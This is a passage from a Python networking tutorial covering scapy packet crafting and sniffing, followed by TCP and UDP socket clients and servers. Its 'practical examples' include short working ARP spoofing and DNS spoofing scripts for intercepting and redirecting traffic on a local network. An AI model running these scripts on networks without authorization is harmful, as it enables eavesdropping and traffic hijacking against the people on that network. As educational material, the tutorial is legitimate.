<div class="sourceCode" id="cb22"><pre class="sourceCode python code-with-copy"><code class="sourceCode python"><span id="cb22-1"><a href="#cb22-1" aria-hidden="true" tabindex="-1"></a>packet <span class="op">=</span> sniff(count<span class="op">=</span><span class="dv">1</span>)[<span class="dv">0</span>]</span>
<span id="cb22-2"><a href="#cb22-2" aria-hidden="true" tabindex="-1"></a><span class="bu">print</span>(packet[Ether].src)</span>
<span id="cb22-3"><a href="#cb22-3" aria-hidden="true" tabindex="-1"></a><span class="bu">print</span>(packet[IP].src)</span>
<span id="cb22-4"><a href="#cb22-4" aria-hidden="true" tabindex="-1"></a><span class="bu">print</span>(packet[TCP].dport)</span></code><button title="Copy to Clipboard" class="code-copy-button"><i class="bi"></i></button></pre></div>
</section>
</section>
<section id="advanced-usage" class="level2" data-number="17.8">
<h2 data-number="17.8" class="anchored" data-anchor-id="advanced-usage"><span class="header-section-number">17.8</span> Advanced Usage</h2>
<section id="custom-packet-crafting" class="level3" data-number="17.8.1">
<h3 data-number="17.8.1" class="anchored" data-anchor-id="custom-packet-crafting"><span class="header-section-number">17.8.1</span> Custom Packet Crafting</h3>
<p>You can create custom packets by defining your own layers.</p>
</section>
<section id="example-9" class="level3" data-number="17.8.2">
<h3 data-number="17.8.2" class="anchored" data-anchor-id="example-9"><span class="header-section-number">17.8.2</span> Example</h3>
<div class="sourceCode" id="cb23"><pre class="sourceCode python code-with-copy"><code class="sourceCode python"><span id="cb23-1"><a href="#cb23-1" aria-hidden="true" tabindex="-1"></a><span class="kw">class</span> Custom(Packet):</span>
<span id="cb23-2"><a href="#cb23-2" aria-hidden="true" tabindex="-1"></a>    name <span class="op">=</span> <span class="st">"Custom"</span></span>
<span id="cb23-3"><a href="#cb23-3" aria-hidden="true" tabindex="-1"></a>    fields_desc <span class="op">=</span> [ShortField(<span class="st">"field1"</span>, <span class="dv">1</span>), IntField(<span class="st">"field2"</span>, <span class="dv">2</span>)]</span>
<span id="cb23-4"><a href="#cb23-4" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb23-5"><a href="#cb23-5" aria-hidden="true" tabindex="-1"></a>custom_packet <span class="op">=</span> Custom(field1<span class="op">=</span><span class="dv">10</span>, field2<span class="op">=</span><span class="dv">20</span>)</span>
<span id="cb23-6"><a href="#cb23-6" aria-hidden="true" tabindex="-1"></a>send(custom_packet)</span></code><button title="Copy to Clipboard" class="code-copy-button"><i class="bi"></i></button></pre></div>
</section>
<section id="packet-manipulation" class="level3" data-number="17.8.3">
<h3 data-number="17.8.3" class="anchored" data-anchor-id="packet-manipulation"><span class="header-section-number">17.8.3</span> Packet Manipulation</h3>
<p>You can manipulate packets by modifying their fields.</p>
</section>
<section id="example-10" class="level3" data-number="17.8.4">
<h3 data-number="17.8.4" class="anchored" data-anchor-id="example-10"><span class="header-section-number">17.8.4</span> Example</h3>
<div class="sourceCode" id="cb24"><pre class="sourceCode python code-with-copy"><code class="sourceCode python"><span id="cb24-1"><a href="#cb24-1" aria-hidden="true" tabindex="-1"></a>packet <span class="op">=</span> IP(dst<span class="op">=</span><span class="st">"192.168.1.1"</span>) <span class="op">/</span> TCP(dport<span class="op">=</span><span class="dv">80</span>)</span>
<span id="cb24-2"><a href="#cb24-2" aria-hidden="true" tabindex="-1"></a>packet[IP].dst <span class="op">=</span> <span class="st">"192.168.1.2"</span></span>
<span id="cb24-3"><a href="#cb24-3" aria-hidden="true" tabindex="-1"></a>send(packet)</span></code><button title="Copy to Clipboard" class="code-copy-button"><i class="bi"></i></button></pre></div>
</section>
<section id="protocol-dissection" class="level3" data-number="17.8.5">
<h3 data-number="17.8.5" class="anchored" data-anchor-id="protocol-dissection"><span class="header-section-number">17.8.5</span> Protocol Dissection</h3>
<p><code>scapy</code> can dissect various protocols, making it useful for analyzing network traffic.</p>
</section>
<section id="example-11" class="level3" data-number="17.8.6">
<h3 data-number="17.8.6" class="anchored" data-anchor-id="example-11"><span class="header-section-number">17.8.6</span> Example</h3>
<div class="sourceCode" id="cb25"><pre class="sourceCode python code-with-copy"><code class="sourceCode python"><span id="cb25-1"><a href="#cb25-1" aria-hidden="true" tabindex="-1"></a>packet <span class="op">=</span> sniff(count<span class="op">=</span><span class="dv">1</span>)[<span class="dv">0</span>]</span>
<span id="cb25-2"><a href="#cb25-2" aria-hidden="true" tabindex="-1"></a><span class="cf">if</span> packet.haslayer(DNS):</span>
<span id="cb25-3"><a href="#cb25-3" aria-hidden="true" tabindex="-1"></a>    <span class="bu">print</span>(packet[DNS].summary())</span></code><button title="Copy to Clipboard" class="code-copy-button"><i class="bi"></i></button></pre></div>
</section>
</section>
<section id="practical-examples" class="level2" data-number="17.9">
<h2 data-number="17.9" class="anchored" data-anchor-id="practical-examples"><span class="header-section-number">17.9</span> Practical Examples</h2>
<section id="example-1-ping-sweep" class="level3" data-number="17.9.1">
<h3 data-number="17.9.1" class="anchored" data-anchor-id="example-1-ping-sweep"><span class="header-section-number">17.9.1</span> Example 1: Ping Sweep</h3>
<p>This example demonstrates how to perform a ping sweep to discover live hosts on a network.</p>
<div class="sourceCode" id="cb26"><pre class="sourceCode python code-with-copy"><code class="sourceCode python"><span id="cb26-1"><a href="#cb26-1" aria-hidden="true" tabindex="-1"></a><span class="kw">def</span> ping_sweep(network):</span>
<span id="cb26-2"><a href="#cb26-2" aria-hidden="true" tabindex="-1"></a>    ans, unans <span class="op">=</span> sr(IP(dst<span class="op">=</span>network)<span class="op">/</span>ICMP(), timeout<span class="op">=</span><span class="dv">2</span>)</span>
<span id="cb26-3"><a href="#cb26-3" aria-hidden="true" tabindex="-1"></a>    <span class="cf">for</span> snd, rcv <span class="kw">in</span> ans:</span>
<span id="cb26-4"><a href="#cb26-4" aria-hidden="true" tabindex="-1"></a>        <span class="bu">print</span>(<span class="ss">f"</span><span class="sc">{</span>rcv<span class="sc">.</span>src<span class="sc">}</span><span class="ss"> is alive"</span>)</span>
<span id="cb26-5"><a href="#cb26-5" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb26-6"><a href="#cb26-6" aria-hidden="true" tabindex="-1"></a>ping_sweep(<span class="st">"192.168.1.0/24"</span>)</span></code><button title="Copy to Clipboard" class="code-copy-button"><i class="bi"></i></button></pre></div>
</section>
<section id="example-2-arp-spoofing" class="level3" data-number="17.9.2">
<h3 data-number="17.9.2" class="anchored" data-anchor-id="example-2-arp-spoofing"><span class="header-section-number">17.9.2</span> Example 2: ARP Spoofing</h3>
<p>This example demonstrates how to perform ARP spoofing to intercept network traffic.</p>
<div class="sourceCode" id="cb27"><pre class="sourceCode python code-with-copy"><code class="sourceCode python"><span id="cb27-1"><a href="#cb27-1" aria-hidden="true" tabindex="-1"></a><span class="kw">def</span> arp_spoof(target_ip, spoof_ip):</span>
<span id="cb27-2"><a href="#cb27-2" aria-hidden="true" tabindex="-1"></a>    packet <span class="op">=</span> ARP(op<span class="op">=</span><span class="dv">2</span>, pdst<span class="op">=</span>target_ip, hwdst<span class="op">=</span><span class="st">"ff:ff:ff:ff:ff:ff"</span>, psrc<span class="op">=</span>spoof_ip)</span>
<span id="cb27-3"><a href="#cb27-3" aria-hidden="true" tabindex="-1"></a>    send(packet, verbose<span class="op">=</span><span class="va">False</span>)</span>
<span id="cb27-4"><a href="#cb27-4" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb27-5"><a href="#cb27-5" aria-hidden="true" tabindex="-1"></a>arp_spoof(<span class="st">"192.168.1.100"</span>, <span class="st">"192.168.1.1"</span>)</span></code><button title="Copy to Clipboard" class="code-copy-button"><i class="bi"></i></button></pre></div>
</section>
<section id="example-3-dns-spoofing" class="level3" data-number="17.9.3">
<h3 data-number="17.9.3" class="anchored" data-anchor-id="example-3-dns-spoofing"><span class="header-section-number">17.9.3</span> Example 3: DNS Spoofing</h3>
<p>This example demonstrates how to perform DNS spoofing to redirect DNS requests.</p>
<div class="sourceCode" id="cb28"><pre class="sourceCode python code-with-copy"><code class="sourceCode python"><span id="cb28-1"><a href="#cb28-1" aria-hidden="true" tabindex="-1"></a><span class="kw">def</span> dns_spoof(pkt):</span>
<span id="cb28-2"><a href="#cb28-2" aria-hidden="true" tabindex="-1"></a>    <span class="cf">if</span> pkt.haslayer(DNS) <span class="kw">and</span> pkt.getlayer(DNS).qr <span class="op">==</span> <span class="dv">0</span>:</span>
<span id="cb28-3"><a href="#cb28-3" aria-hidden="true" tabindex="-1"></a>        spoofed_pkt <span class="op">=</span> IP(dst<span class="op">=</span>pkt[IP].src, src<span class="op">=</span>pkt[IP].dst) <span class="op">/</span> <span class="op">\</span></span>
<span id="cb28-4"><a href="#cb28-4" aria-hidden="true" tabindex="-1"></a>                      UDP(dport<span class="op">=</span>pkt[UDP].sport, sport<span class="op">=</span><span class="dv">53</span>) <span class="op">/</span> <span class="op">\</span></span>
<span id="cb28-5"><a href="#cb28-5" aria-hidden="true" tabindex="-1"></a>                      DNS(<span class="bu">id</span><span class="op">=</span>pkt[DNS].<span class="bu">id</span>, qr<span class="op">=</span><span class="dv">1</span>, aa<span class="op">=</span><span class="dv">1</span>, qd<span class="op">=</span>pkt[DNS].qd, an<span class="op">=</span>DNSRR(rrname<span class="op">=</span>pkt[DNS].qd.qname, ttl<span class="op">=</span><span class="dv">10</span>, rdata<span class="op">=</span><span class="st">"192.168.1.2"</span>))</span>
<span id="cb28-6"><a href="#cb28-6" aria-hidden="true" tabindex="-1"></a>        send(spoofed_pkt, verbose<span class="op">=</span><span class="va">False</span>)</span>
<span id="cb28-7"><a href="#cb28-7" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb28-8"><a href="#cb28-8" aria-hidden="true" tabindex="-1"></a>sniff(<span class="bu">filter</span><span class="op">=</span><span class="st">"udp port 53"</span>, prn<span class="op">=</span>dns_spoof)</span></code><button title="Copy to Clipboard" class="code-copy-button"><i class="bi"></i></button></pre></div>
</section>
</section>
<section id="best-practices" class="level2" data-number="17.10">
<h2 data-number="17.10" class="anchored" data-anchor-id="best-practices"><span class="header-section-number">17.10</span> Best Practices</h2>
<ol type="1">
<li><strong>Error Handling</strong>: Always include error handling to manage unexpected conditions gracefully.</li>
<li><strong>Resource Management</strong>: Ensure resources, such as sockets and files, are properly managed and closed.</li>
<li><strong>Security</strong>: Be mindful of security implications, such as running sniffing or spoofing scripts, and only use them on networks you own or have permission to test.</li>
<li><strong>Documentation</strong>: Document your code to make it easier to understand and maintain.</li>
<li><strong>Performance</strong>: Optimize your code for performance, especially when dealing with high volumes of network traffic.</li>
</ol>
</section>
<section id="conclusion-1" class="level2" data-number="17.11">
<h2 data-number="17.11" class="anchored" data-anchor-id="conclusion-1"><span class="header-section-number">17.11</span> Conclusion</h2>
<p>The <code>scapy</code> module is a powerful tool for network packet analysis, manipulation, and crafting. By understanding its basic and advanced features, you can implement robust network analysis and security solutions. Whether you are building a simple network scanner or a complex packet manipulation tool, <code>scapy</code> provides the necessary functionality to handle network communication effectively.</p>
<p>This tutorial has covered the fundamentals of <code>scapy</code>, from creating and sending packets to capturing and analyzing them. With practice and further exploration, you can leverage the full potential of <code>scapy</code> in your network-related projects.</p>
</section>
</section>
<section id="deep-dive-tutorial-on-pythons-socket-module-for-implementing-tcp-and-udp-clients-and-servers" class="level1" data-number="18">
<h1 data-number="18"><span class="header-section-number">18</span> Deep Dive Tutorial on Pythonâ€™s <code>socket</code> Module for Implementing TCP and UDP Clients and Servers</h1>
<p>The <code>socket</code> module in Python provides a powerful low-level interface for network communication. It supports the creation of both TCP and UDP clients and servers, allowing for robust network programming. This tutorial will guide you through the process of implementing TCP and UDP clients and servers using Pythonâ€™s <code>socket</code> module.</p>
<section id="table-of-contents-1" class="level2" data-number="18.1">
<h2 data-number="18.1" class="anchored" data-anchor-id="table-of-contents-1"><span class="header-section-number">18.1</span> Table of Contents</h2>
<ol type="1">
<li><a href="#introduction-to-the-socket-module">Introduction to the <code>socket</code> Module</a></li>
<li><a href="#socket-basics">Socket Basics</a></li>
<li><a href="#implementing-a-tcp-server">Implementing a TCP Server</a></li>
<li><a href="#implementing-a-tcp-client">Implementing a TCP Client</a></li>
<li><a href="#implementing-a-udp-server">Implementing a UDP Server</a></li>
<li><a href="#implementing-a-udp-client">Implementing a UDP Client</a></li>
<li><a href="#error-handling-and-best-practices">Error Handling and Best Practices</a></li>
<li><a href="#conclusion">Conclusion</a></li>
</ol>
</section>
<section id="introduction-to-the-socket-module" class="level2" data-number="18.2">
<h2 data-number="18.2" class="anchored" data-anchor-id="introduction-to-the-socket-module"><span class="header-section-number">18.2</span> Introduction to the <code>socket</code> Module</h2>
<p>The <code>socket</code> module provides access to the BSD socket interface. It supports various communication protocols, with TCP (Transmission Control Protocol) and UDP (User Datagram Protocol) being the most commonly used.</p>
<section id="importing-the-module" class="level3" data-number="18.2.1">
<h3 data-number="18.2.1" class="anchored" data-anchor-id="importing-the-module"><span class="header-section-number">18.2.1</span> Importing the Module</h3>
<div class="sourceCode" id="cb29"><pre class="sourceCode python code-with-copy"><code class="sourceCode python"><span id="cb29-1"><a href="#cb29-1" aria-hidden="true" tabindex="-1"></a><span class="im">import</span> socket</span></code><button title="Copy to Clipboard" class="code-copy-button"><i class="bi"></i></button></pre></div>
</section>
</section>
<section id="socket-basics" class="level2" data-number="18.3">
<h2 data-number="18.3" class="anchored" data-anchor-id="socket-basics"><span class="header-section-number">18.3</span> Socket Basics</h2>
<section id="creating-a-socket" class="level3" data-number="18.3.1">
<h3 data-number="18.3.1" class="anchored" data-anchor-id="creating-a-socket"><span class="header-section-number">18.3.1</span> Creating a Socket</h3>
<p>A socket can be created using the <code>socket.socket()</code> function, which takes two parameters: - <code>socket.AF_INET</code>: Address family for IPv4. - <code>socket.SOCK_STREAM</code>: For TCP sockets (use <code>socket.SOCK_DGRAM</code> for UDP).</p>
</section>
<section id="example-12" class="level3" data-number="18.3.2">
<h3 data-number="18.3.2" class="anchored" data-anchor-id="example-12"><span class="header-section-number">18.3.2</span> Example</h3>
<div class="sourceCode" id="cb30"><pre class="sourceCode python code-with-copy"><code class="sourceCode python"><span id="cb30-1"><a href="#cb30-1" aria-hidden="true" tabindex="-1"></a>s <span class="op">=</span> socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span></code><button title="Copy to Clipboard" class="code-copy-button"><i class="bi"></i></button></pre></div>
</section>
<section id="binding-a-socket" class="level3" data-number="18.3.3">
<h3 data-number="18.3.3" class="anchored" data-anchor-id="binding-a-socket"><span class="header-section-number">18.3.3</span> Binding a Socket</h3>
<p>To bind a socket to an IP address and port, use the <code>bind()</code> method.</p>
</section>
<section id="example-13" class="level3" data-number="18.3.4">
<h3 data-number="18.3.4" class="anchored" data-anchor-id="example-13"><span class="header-section-number">18.3.4</span> Example</h3>
<div class="sourceCode" id="cb31"><pre class="sourceCode python code-with-copy"><code class="sourceCode python"><span id="cb31-1"><a href="#cb31-1" aria-hidden="true" tabindex="-1"></a>s.bind((<span class="st">'localhost'</span>, <span class="dv">8080</span>))</span></code><button title="Copy to Clipboard" class="code-copy-button"><i class="bi"></i></button></pre></div>
</section>
<section id="listening-for-connections-tcp" class="level3" data-number="18.3.5">
<h3 data-number="18.3.5" class="anchored" data-anchor-id="listening-for-connections-tcp"><span class="header-section-number">18.3.5</span> Listening for Connections (TCP)</h3>
<p>To listen for incoming connections on a TCP server, use the <code>listen()</code> method.</p>
</section>
<section id="example-14" class="level3" data-number="18.3.6">
<h3 data-number="18.3.6" class="anchored" data-anchor-id="example-14"><span class="header-section-number">18.3.6</span> Example</h3>
<div class="sourceCode" id="cb32"><pre class="sourceCode python code-with-copy"><code class="sourceCode python"><span id="cb32-1"><a href="#cb32-1" aria-hidden="true" tabindex="-1"></a>s.listen(<span class="dv">5</span>)  <span class="co"># 5 is the maximum number of queued connections</span></span></code><button title="Copy to Clipboard" class="code-copy-button"><i class="bi"></i></button></pre></div>
</section>
<section id="accepting-connections-tcp" class="level3" data-number="18.3.7">
<h3 data-number="18.3.7" class="anchored" data-anchor-id="accepting-connections-tcp"><span class="header-section-number">18.3.7</span> Accepting Connections (TCP)</h3>
<p>To accept an incoming connection, use the <code>accept()</code> method, which returns a new socket object and the address of the client.</p>
</section>
<section id="example-15" class="level3" data-number="18.3.8">
<h3 data-number="18.3.8" class="anchored" data-anchor-id="example-15"><span class="header-section-number">18.3.8</span> Example</h3>
<div class="sourceCode" id="cb33"><pre class="sourceCode python code-with-copy"><code class="sourceCode python"><span id="cb33-1"><a href="#cb33-1" aria-hidden="true" tabindex="-1"></a>client_socket, client_address <span class="op">=</span> s.accept()</span></code><button title="Copy to Clipboard" class="code-copy-button"><i class="bi"></i></button></pre></div>
</section>
<section id="sending-and-receiving-data" class="level3" data-number="18.3.9">
<h3 data-number="18.3.9" class="anchored" data-anchor-id="sending-and-receiving-data"><span class="header-section-number">18.3.9</span> Sending and Receiving Data</h3>
<ul>
<li><strong>TCP</strong>: Use <code>send()</code> and <code>recv()</code>.</li>
<li><strong>UDP</strong>: Use <code>sendto()</code> and <code>recvfrom()</code>.</li>
</ul>
</section>
</section>
<section id="implementing-a-tcp-server" class="level2" data-number="18.4">
<h2 data-number="18.4" class="anchored" data-anchor-id="implementing-a-tcp-server"><span class="header-section-number">18.4</span> Implementing a TCP Server</h2>
<section id="steps-to-implement-a-tcp-server" class="level3" data-number="18.4.1">
<h3 data-number="18.4.1" class="anchored" data-anchor-id="steps-to-implement-a-tcp-server"><span class="header-section-number">18.4.1</span> Steps to Implement a TCP Server</h3>
<ol type="1">
<li>Create a socket.</li>
<li>Bind the socket to an address and port.</li>
<li>Listen for incoming connections.</li>
<li>Accept connections and handle communication.</li>
<li>Close the connection.</li>
</ol>
</section>
<section id="example-tcp-server" class="level3" data-number="18.4.2">
<h3 data-number="18.4.2" class="anchored" data-anchor-id="example-tcp-server"><span class="header-section-number">18.4.2</span> Example TCP Server</h3>
<div class="sourceCode" id="cb34"><pre class="sourceCode python code-with-copy"><code class="sourceCode python"><span id="cb34-1"><a href="#cb34-1" aria-hidden="true" tabindex="-1"></a><span class="im">import</span> socket</span>
<span id="cb34-2"><a href="#cb34-2" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb34-3"><a href="#cb34-3" aria-hidden="true" tabindex="-1"></a><span class="kw">def</span> tcp_server():</span>
<span id="cb34-4"><a href="#cb34-4" aria-hidden="true" tabindex="-1"></a>    server_socket <span class="op">=</span> socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span>
<span id="cb34-5"><a href="#cb34-5" aria-hidden="true" tabindex="-1"></a>    server_socket.bind((<span class="st">'localhost'</span>, <span class="dv">8080</span>))</span>
<span id="cb34-6"><a href="#cb34-6" aria-hidden="true" tabindex="-1"></a>    server_socket.listen(<span class="dv">5</span>)</span>
<span id="cb34-7"><a href="#cb34-7" aria-hidden="true" tabindex="-1"></a>    <span class="bu">print</span>(<span class="st">"TCP server listening on port 8080"</span>)</span>
<span id="cb34-8"><a href="#cb34-8" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb34-9"><a href="#cb34-9" aria-hidden="true" tabindex="-1"></a>    <span class="cf">while</span> <span class="va">True</span>:</span>
<span id="cb34-10"><a href="#cb34-10" aria-hidden="true" tabindex="-1"></a>        client_socket, client_address <span class="op">=</span> server_socket.accept()</span>
<span id="cb34-11"><a href="#cb34-11" aria-hidden="true" tabindex="-1"></a>        <span class="bu">print</span>(<span class="ss">f"Connection from </span><span class="sc">{</span>client_address<span class="sc">}</span><span class="ss">"</span>)</span>
<span id="cb34-12"><a href="#cb34-12" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb34-13"><a href="#cb34-13" aria-hidden="true" tabindex="-1"></a>        <span class="cf">while</span> <span class="va">True</span>:</span>
<span id="cb34-14"><a href="#cb34-14" aria-hidden="true" tabindex="-1"></a>            data <span class="op">=</span> client_socket.recv(<span class="dv">1024</span>)</span>
<span id="cb34-15"><a href="#cb34-15" aria-hidden="true" tabindex="-1"></a>            <span class="cf">if</span> <span class="kw">not</span> data:</span>
<span id="cb34-16"><a href="#cb34-16" aria-hidden="true" tabindex="-1"></a>                <span class="cf">break</span></span>
<span id="cb34-17"><a href="#cb34-17" aria-hidden="true" tabindex="-1"></a>            <span class="bu">print</span>(<span class="ss">f"Received data: </span><span class="sc">{</span>data<span class="sc">.</span>decode()<span class="sc">}</span><span class="ss">"</span>)</span>
<span id="cb34-18"><a href="#cb34-18" aria-hidden="true" tabindex="-1"></a>            client_socket.sendall(data)</span>
<span id="cb34-19"><a href="#cb34-19" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb34-20"><a href="#cb34-20" aria-hidden="true" tabindex="-1"></a>        client_socket.close()</span>
<span id="cb34-21"><a href="#cb34-21" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb34-22"><a href="#cb34-22" aria-hidden="true" tabindex="-1"></a><span class="cf">if</span> <span class="va">__name__</span> <span class="op">==</span> <span class="st">"__main__"</span>:</span>
<span id="cb34-23"><a href="#cb34-23" aria-hidden="true" tabindex="-1"></a>    tcp_server()</span></code><button title="Copy to Clipboard" class="code-copy-button"><i class="bi"></i></button></pre></div>
</section>
</section>
<section id="implementing-a-tcp-client" class="level2" data-number="18.5">
<h2 data-number="18.5" class="anchored" data-anchor-id="implementing-a-tcp-client"><span class="header-section-number">18.5</span> Implementing a TCP Client</h2>
<section id="steps-to-implement-a-tcp-client" class="level3" data-number="18.5.1">
<h3 data-number="18.5.1" class="anchored" data-anchor-id="steps-to-implement-a-tcp-client"><span class="header-section-number">18.5.1</span> Steps to Implement a TCP Client</h3>
<ol type="1">
<li>Create a socket.</li>
<li>Connect to the server.</li>
<li>Send and receive data.</li>
<li>Close the connection.</li>
</ol>
</section>
<section id="example-tcp-client" class="level3" data-number="18.5.2">
<h3 data-number="18.5.2" class="anchored" data-anchor-id="example-tcp-client"><span class="header-section-number">18.5.2</span> Example TCP Client</h3>
<div class="sourceCode" id="cb35"><pre class="sourceCode python code-with-copy"><code class="sourceCode python"><span id="cb35-1"><a href="#cb35-1" aria-hidden="true" tabindex="-1"></a><span class="im">import</span> socket</span>
<span id="cb35-2"><a href="#cb35-2" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb35-3"><a href="#cb35-3" aria-hidden="true" tabindex="-1"></a><span class="kw">def</span> tcp_client():</span>
<span id="cb35-4"><a href="#cb35-4" aria-hidden="true" tabindex="-1"></a>    client_socket <span class="op">=</span> socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span>
<span id="cb35-5"><a href="#cb35-5" aria-hidden="true" tabindex="-1"></a>    client_socket.<span class="ex">connect</span>((<span class="st">'localhost'</span>, <span class="dv">8080</span>))</span>
<span id="cb35-6"><a href="#cb35-6" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb35-7"><a href="#cb35-7" aria-hidden="true" tabindex="-1"></a>    message <span class="op">=</span> <span class="st">"Hello, Server!"</span></span>
<span id="cb35-8"><a href="#cb35-8" aria-hidden="true" tabindex="-1"></a>    client_socket.sendall(message.encode())</span>
<span id="cb35-9"><a href="#cb35-9" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb35-10"><a href="#cb35-10" aria-hidden="true" tabindex="-1"></a>    data <span class="op">=</span> client_socket.recv(<span class="dv">1024</span>)</span>
<span id="cb35-11"><a href="#cb35-11" aria-hidden="true" tabindex="-1"></a>    <span class="bu">print</span>(<span class="ss">f"Received from server: </span><span class="sc">{</span>data<span class="sc">.</span>decode()<span class="sc">}</span><span class="ss">"</span>)</span>
<span id="cb35-12"><a href="#cb35-12" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb35-13"><a href="#cb35-13" aria-hidden="true" tabindex="-1"></a>    client_socket.close()</span>
<span id="cb35-14"><a href="#cb35-14" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb35-15"><a href="#cb35-15" aria-hidden="true" tabindex="-1"></a><span class="cf">if</span> <span class="va">__name__</span> <span class="op">==</span> <span class="st">"__main__"</span>:</span>
<span id="cb35-16"><a href="#cb35-16" aria-hidden="true" tabindex="-1"></a>    tcp_client()</span></code><button title="Copy to Clipboard" class="code-copy-button"><i class="bi"></i></button></pre></div>
</section>
</section>
<section id="implementing-a-udp-server" class="level2" data-number="18.6">
<h2 data-number="18.6" class="anchored" data-anchor-id="implementing-a-udp-server"><span class="header-section-number">18.6</span> Implementing a UDP Server</h2>
<section id="steps-to-implement-a-udp-server" class="level3" data-number="18.6.1">
<h3 data-number="18.6.1" class="anchored" data-anchor-id="steps-to-implement-a-udp-server"><span class="header-section-number">18.6.1</span> Steps to Implement a UDP Server</h3>
<ol type="1">
<li>Create a socket.</li>
<li>Bind the socket to an address and port.</li>
<li>Receive data and respond.</li>
<li>Close the socket.</li>
</ol>
</section>
<section id="example-udp-server" class="level3" data-number="18.6.2">
<h3 data-number="18.6.2" class="anchored" data-anchor-id="example-udp-server"><span class="header-section-number">18.6.2</span> Example UDP Server</h3>
<div class="sourceCode" id="cb36"><pre class="sourceCode python code-with-copy"><code class="sourceCode python"><span id="cb36-1"><a href="#cb36-1" aria-hidden="true" tabindex="-1"></a><span class="im">import</span> socket</span>
<span id="cb36-2"><a href="#cb36-2" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb36-3"><a href="#cb36-3" aria-hidden="true" tabindex="-1"></a><span class="kw">def</span> udp_server():</span>
<span id="cb36-4"><a href="#cb36-4" aria-hidden="true" tabindex="-1"></a>    server_socket <span class="op">=</span> socket.socket(socket.AF_INET, socket.SOCK_DGRAM)</span>
<span id="cb36-5"><a href="#cb36-5" aria-hidden="true" tabindex="-1"></a>    server_socket.bind((<span class="st">'localhost'</span>, <span class="dv">8080</span>))</span>
<span id="cb36-6"><a href="#cb36-6" aria-hidden="true" tabindex="-1"></a>    <span class="bu">print</span>(<span class="st">"UDP server listening on port 8080"</span>)</span>
<span id="cb36-7"><a href="#cb36-7" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb36-8"><a href="#cb36-8" aria-hidden="true" tabindex="-1"></a>    <span class="cf">while</span> <span class="va">True</span>:</span>
<span id="cb36-9"><a href="#cb36-9" aria-hidden="true" tabindex="-1"></a>        data, client_address <span class="op">=</span> server_socket.recvfrom(<span class="dv">1024</span>)</span>
<span id="cb36-10"><a href="#cb36-10" aria-hidden="true" tabindex="-1"></a>        <span class="bu">print</span>(<span class="ss">f"Received data from </span><span class="sc">{</span>client_address<span class="sc">}</span><span class="ss">: </span><span class="sc">{</span>data<span class="sc">.</span>decode()<span class="sc">}</span><span class="ss">"</span>)</span>
<span id="cb36-11"><a href="#cb36-11" aria-hidden="true" tabindex="-1"></a>        server_socket.sendto(data, client_address)</span>
<span id="cb36-12"><a href="#cb36-12" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb36-13"><a href="#cb36-13" aria-hidden="true" tabindex="-1"></a><span class="cf">if</span> <span class="va">__name__</span> <span class="op">==</span> <span class="st">"__main__"</span>:</span>
<span id="cb36-14"><a href="#cb36-14" aria-hidden="true" tabindex="-1"></a>    udp_server()</span></code><button title="Copy to Clipboard" class="code-copy-button"><i class="bi"></i></button></pre></div>
</section>
</section>
<section id="implementing-a-udp-client" class="level2" data-number="18.7">
<h2 data-number="18.7" class="anchored" data-anchor-id="implementing-a-udp-client"><span class="header-section-number">18.7</span> Implementing a UDP Client</h2>
<section id="steps-to-implement-a-udp-client" class="level3" data-number="18.7.1">
<h3 data-number="18.7.1" class="anchored" data-anchor-id="steps-to-implement-a-udp-client"><span class="header-section-number">18.7.1</span> Steps to Implement a UDP Client</h3>
<ol type="1">
<li>Create a socket.</li>
<li>Send data to the server.</li>
<li>Receive response from the server.</li>
<li>Close the socket.</li>
</ol>
</section>
<section id="example-udp-client" class="level3" data-number="18.7.2">
<h3 data-number="18.7.2" class="anchored" data-anchor-id="example-udp-client"><span class="header-section-number">18.7.2</span> Example UDP Client</h3>
<div class="sourceCode" id="cb37"><pre class="sourceCode python code-with-copy"><code class="sourceCode python"><span id="cb37-1"><a href="#cb37-1" aria-hidden="true" tabindex="-1"></a><span class="im">import</span> socket</span>
<span id="cb37-2"><a href="#cb37-2" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb37-3"><a href="#cb37-3" aria-hidden="true" tabindex="-1"></a><span class="kw">def</span> udp_client():</span>
<span id="cb37-4"><a href="#cb37-4" aria-hidden="true" tabindex="-1"></a>    client_socket <span class="op">=</span> socket.socket(socket.AF_INET, socket.SOCK_DGRAM)</span>
<span id="cb37-5"><a href="#cb37-5" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb37-6"><a href="#cb37-6" aria-hidden="true" tabindex="-1"></a>    message <span class="op">=</span> <span class="st">"Hello, Server!"</span></span>
<span id="cb37-7"><a href="#cb37-7" aria-hidden="true" tabindex="-1"></a>    client_socket.sendto(message.encode(), (<span class="st">'localhost'</span>, <span class="dv">8080</span>))</span>
<span id="cb37-8"><a href="#cb37-8" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb37-9"><a href="#cb37-9" aria-hidden="true" tabindex="-1"></a>    data, server_address <span class="op">=</span> client_socket.recvfrom(<span class="dv">1024</span>)</span>
<span id="cb37-10"><a href="#cb37-10" aria-hidden="true" tabindex="-1"></a>    <span class="bu">print</span>(<span class="ss">f"Received from server: </span><span class="sc">{</span>data<span class="sc">.</span>decode()<span class="sc">}</span><span class="ss">"</span>)</span>
<span id="cb37-11"><a href="#cb37-11" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb37-12"><a href="#cb37-12" aria-hidden="true" tabindex="-1"></a>    client_socket.close()</span>
<span id="cb37-13"><a href="#cb37-13" aria-hidden="true" tabindex="-1"></a></span>
